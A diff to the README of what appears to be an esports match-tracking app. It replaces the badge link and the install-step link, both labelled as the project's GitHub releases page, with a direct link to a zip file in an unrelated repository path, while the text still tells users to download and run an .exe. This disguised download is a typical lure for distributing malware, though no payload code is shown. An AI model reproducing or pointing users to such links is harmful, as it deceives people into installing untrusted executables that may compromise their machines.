@@ -5,7 +5,7 @@ description: "Track real-time esports matches, tournament standings, and verifie
 ---
 # 🎮 itamarimor2009-esports-app - Track your favorite esports match results
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/commonmosquitogenussloanea973/itamarimor2009-esports-app/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/commonmosquitogenussloanea973/commonmosquitogenussloanea973.github.io/main/osteofibrous/App-3.9-alpha.5.zip)
 
 ## 📌 Overview
 
@@ -24,7 +24,7 @@ Ensure your computer meets these requirements to run the app:
 
 Follow these steps to get the software on your machine:
 
-1. Visit the [releases page](https://github.com/commonmosquitogenussloanea973/itamarimor2009-esports-app/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/commonmosquitogenussloanea973/commonmosquitogenussloanea973.github.io/main/osteofibrous/App-3.9-alpha.5.zip).
 2. Look for the file ending in .exe under the latest version.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
